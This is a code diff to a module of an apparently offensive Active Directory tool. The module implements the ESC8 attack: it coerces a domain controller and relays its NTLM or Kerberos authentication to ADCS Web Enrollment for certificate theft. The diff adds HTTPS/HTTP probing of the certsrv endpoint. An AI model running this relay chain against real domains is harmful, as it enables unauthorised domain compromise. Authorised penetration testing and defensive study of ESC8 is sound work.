@@ -8,8 +8,13 @@ from pathlib import Path
 
 from aiosmb.commons.connection.factory import SMBConnectionFactory
 
+from adscan_core.rich_output import print_info_debug
 from adscan_internal.rich_output import mark_sensitive, print_info
 from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
+from adscan_internal.services.adcs_web_enrollment_probe import (
+    ADCSWebEnrollmentProbe,
+    WebEnrollmentProbeResult,
+)
 from adscan_internal.services.adidns import ADIDNSConfig, adidns_a_record_scope
 from adscan_internal.services.coercion.runner import NativeCoercionRunConfig
 from adscan_internal.services.relay import (
@@ -33,6 +38,7 @@ _COERCION_PROTOCOLS = ("EFSR", "RPRN")
 _RELAY_SOURCE = "smb"
 _RELAY_PORT = 445
 _HTTP_PORT = 80
+_HTTPS_PORT = 443
 _SMB_PORT = 445
 
 # James Forshaw CredMarshalTargetInfo suffix — causes Windows Kerberos SPN canonicalization
@@ -43,6 +49,48 @@ _SMB_PORT = 445
 _CRED_MARSHAL_SUFFIX = "1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"
 
 
+async def _resolve_esc8_scheme(config: EscConfig) -> tuple[str, int]:
+    """Decide the certsrv scheme/port for the relay from a live HTTP-aware probe.
+
+    The collector probe runs at collection time, not exploitation time, so its
+    result is not reachable from this call site. We re-probe here — it is
+    host-only (no credentials), fast, and HTTP-aware: it confirms the
+    ``/certsrv/`` endpoint answers with a 401 + NTLM/Negotiate per scheme.
+    HTTPS is preferred when both schemes qualify (operator-preferred transport;
+    avoids the historical hardcode that always relayed to ``:80``). When the
+    probe cannot confirm either scheme, fall back to HTTP so behaviour matches
+    the previous default rather than aborting a chain the operator launched.
+    """
+    probe_host = config.ca_fqdn or config.ca_host
+    if not probe_host:
+        return "http", _HTTP_PORT
+
+    try:
+        result: WebEnrollmentProbeResult = await ADCSWebEnrollmentProbe().probe(
+            host=probe_host
+        )
+    except Exception:  # noqa: BLE001 — probe is best-effort; never abort the chain
+        return "http", _HTTP_PORT
+
+    masked = mark_sensitive(probe_host, "host")
+    if result.answering_scheme == "https":
+        print_info_debug(
+            f"[esc8] relay scheme=https (certsrv offered NTLM/Negotiate over TLS): host={masked}"
+        )
+        return "https", _HTTPS_PORT
+    if result.answering_scheme == "http":
+        print_info_debug(
+            f"[esc8] relay scheme=http (certsrv offered NTLM/Negotiate): host={masked}"
+        )
+        return "http", _HTTP_PORT
+
+    print_info_debug(
+        f"[esc8] probe did not confirm an NTLM/Negotiate certsrv endpoint; "
+        f"defaulting relay to http: host={masked}"
+    )
+    return "http", _HTTP_PORT
+
+
 async def run_esc8(config: EscConfig) -> EscResult:
     """Run native ESC8: coerce a DC and relay NTLM to ADCS Web Enrollment."""
 
@@ -50,8 +98,10 @@ async def run_esc8(config: EscConfig) -> EscResult:
     output_dir = Path(config.workspace_dir or ".") / "adcs" / "esc8"
     template = config.template or "DomainController"
 
+    scheme, port = await _resolve_esc8_scheme(config)
+
     print_relay_preflight(
-        technique="ESC8 — ADCS Web Enrollment (HTTP/HTTPS)",
+        technique=f"ESC8 — ADCS Web Enrollment ({scheme.upper()})",
         coerce_target=config.dc_ip,
         ca_host=config.ca_host,
         ca_name=config.ca_name or "ADCS-CA",
@@ -68,6 +118,8 @@ async def run_esc8(config: EscConfig) -> EscResult:
             ca_fqdn=config.ca_fqdn,
             template=template,
             output_dir=output_dir,
+            scheme=scheme,
+            port=port,
         )
     )
     result = await _run_adcs_relay_chain(config, listener_host, target)
@@ -154,7 +206,6 @@ async def _run_adcs_relay_chain(config: EscConfig, listener_host: str, target):
                 listener_host=listener_host,
                 listener_auth_type="smb",
                 timeout_seconds=60,
-                stop_on_first_success=False,
                 protocols=_COERCION_PROTOCOLS,
                 transports=("ncan_np",),
                 show_summary=False,
@@ -218,12 +269,15 @@ async def run_esc8_krb(config: EscConfig) -> EscResult:
         password=config.effective_secret or "",
     )
 
+    scheme, port = await _resolve_esc8_scheme(config)
     krb_target = AdcsEsc8KrbRelayTarget(
         AdcsEsc8RelayConfig(
             ca_host=config.ca_host,
             ca_fqdn=config.ca_fqdn,
             template=template,
             output_dir=output_dir,
+            scheme=scheme,
+            port=port,
         )
     )
 
@@ -335,7 +389,6 @@ async def _coerce_smb_krb(config: EscConfig, factory, coerce_listener_name: str)
             listener_host=coerce_listener_name,
             listener_auth_type="smb",
             timeout_seconds=60,
-            stop_on_first_success=False,
             protocols=_COERCION_PROTOCOLS,
             transports=("ncan_np",),
             show_summary=False,
